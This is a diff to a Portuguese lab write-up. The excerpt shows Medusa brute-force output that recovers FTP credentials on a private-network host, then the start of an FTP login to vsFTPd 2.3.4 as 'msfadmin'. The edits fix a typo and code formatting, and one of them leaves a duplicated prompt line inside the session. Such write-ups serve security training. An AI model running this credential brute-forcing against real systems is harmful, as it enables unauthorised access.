@@ -90,11 +90,11 @@ Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.n
 2026-11-10 11:48:04 ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: qewrty (4 of 4 complete)
 ```
 
-Validação do acesso FTP com login e senha encontraodo com "SUCCESS"
+Validação do acesso FTP com login e senha encontrado com SUCCESS
 
-                                                                                                                                                                         ```                                                                                                                                                                      
-┌──(kali@kali)-[~]\
+```                                                                                                                                                                      ┌──(kali@kali)-[~]\
 └─$ ftp 192.168.56.102\
+┌──(kali@kali)-[~]\
 Connected to 192.168.56.102.\
 220 (vsFTPd 2.3.4)\
 Name (192.168.56.102:kali): msfadmin\ 
